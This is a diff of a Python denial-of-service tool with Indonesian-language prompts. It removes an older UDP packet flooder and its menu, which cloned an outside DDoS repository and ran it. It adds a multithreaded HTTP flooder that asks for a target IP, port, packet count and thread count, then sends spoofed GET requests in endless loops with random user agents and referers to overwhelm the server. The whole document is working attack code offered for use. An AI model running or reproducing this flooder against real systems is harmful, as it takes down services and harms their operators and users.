@@ -1,6 +1,8 @@
 import sys,os,time,random,socket
 from colorama import Fore,Back,init
-
+import socket
+import random
+import threading
 B = Fore.BLUE
 W = Fore.WHITE
 R = Fore.RED
@@ -13,40 +15,6 @@ abu="\033[1;90m"
 kuning="\033[1;93m"
 ungu="\033[1;95m"
 biru="\033[1;96m"
-#Tulisan Background Merah
-bg="\033[1;0m\033[1;41mText\033[1;0m"
-
-def tanya():
-    tanya=input(f"{putih}Main Lagi{abu}? {putih}({biru}y{B}/{biru}n{W}){R}:{W}")
-    if tanya == "y" or tanya == "Y":
-        os.system("python ddos_tytyd.py")
-    if tanya == "n" or tanya == "N":
-        print (Back.BLUE+Fore.WHITE+"Thx For Use My Tools\033[1;0m")
-
-def flood(victim, vport, duration):
-    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(20000)
-    timeout =  time.time() + duration
-    sent = 3000
-
-    while 1:
-        if time.time() > timeout:
-            break
-        else:
-            pass
-        client.sendto(bytes, (victim, vport))
-        sent = sent + 1
-        print ("\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport))
-
-def main():
-    try:
-        print (len(sys.argv))
-        if len(sys.argv) != 4:
-            usage()
-        else:
-            flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
-    except IndexError:
-        sys.exit("use:python ddos.py bla")
 
 def usage():
 	print(f"""
@@ -56,44 +24,66 @@ def usage():
 {R}/_______  /{W}\____ |\____/____  >
 {R}        \/ {W}     \/          \/ {G}.{W}v{R}2\n""")
 
-def v1():
-    print ("Jika Tidak Berfungsi Silakan Ketik Manual:\ncd DDOS_TOOLS && python ddos.py")
-    time.sleep(8)
-    os.system("git clone https://github.com/AmmarrBN/DDOS_TOOLS")
-    os.system("python3 ddos.py")
-    
+# DDOS TCP FLOODER
+# v0.0.2
+print("Welcome D2 DDoS")
 
-def put():
-    usage()
-    print(f"""
-{putih}1{R}.{W}DDOS-v1 {biru}({Y}Low{biru}) {biru}({Y}rendah{biru})
-{putih}2{R}.{W}DDOS-v2 {biru}({R}High{biru}) {biru}({R}tinggi{biru})
-{putih}3{R}.{W}Report Bug {biru}({ungu}Instagram{biru})
-{putih}4{R}.{W}Join Executed Team {biru}({G}WhatsApp{biru})
-{putih}5{R}.{W}Cek Ip Host Target {biru}({G}Check Ip{biru})
-""")
-    put=input(f"{W}Input Menu {Y}──{R}⟩{ungu} ")
-    if put == "1":
-        v1()
-    if put == "2":
-        a = input(f"{W}Ip:{G}")
-        b = input(f"{W}Port:{G}")
-        c = input(f"{W}Packet:{G}")
-        os.system(f"cd setup && python v2.py")
-        time.sleep(10)
-        os.system(f"cd setup && python v2.py {a} {b} {c}")
-    if put == "3":
-        os.system("xdg-open https://www.instagram.com/ammarexecuted/")
-        tanya()
-    if put == "4":
-        os.system("xdg-open https://chat.whatsapp.com/GRZoMoLPNJA22TR7WINpMY")
-        tanya()
-    if put == "5":
-        d = input(f"{W}[{Y}?{W}] Host Name{R}:{G}")
-        print (f"{W}[{R}!{W}] Click {G}ctrl+c{W} button to stop")
-        time.sleep(5)
-        os.system(f"ping {d}")
-        tanya()
 
-if __name__ == '__main__':
-    put()
+useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
+"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
+"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
+"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
+"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
+"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
+"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
+"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
+"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
+"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
+"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
+ref=['http://www.bing.com/search?q=',
+'https://www.yandex.com/yandsearch?text=',
+'https://duckduckgo.com/?q=']
+acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+"Accept-Encoding: gzip, deflate\r\n",
+"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
+"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
+"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
+"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
+"Accept-Language: en-US,en;q=0.5\r\n"]
+
+ip = str(input('[+] Target: '))
+port = int(input('[+] Port: '))
+pack = int(input('[+] Packet/s: '))
+thread = int(input('[+] Threads: '))
+def start():
+    global useragents, ref, acceptall
+    hh = random._urandom(3016)
+    xx = int(0)
+    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
+    accept = random.choice(acceptall)
+    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
+    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
+    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+    main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(ip),int(port)))
+            s.send(str.encode(main_req))
+            for i in range(pack):
+                s.send(str.encode(main_req))
+            xx += random.randint(0, int(pack))
+            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
+        except:
+            s.close()
+            print('[+] Server Down.')
+
+for x in range(thread):
+    thred = threading.Thread(target=start)
+    thred.start()
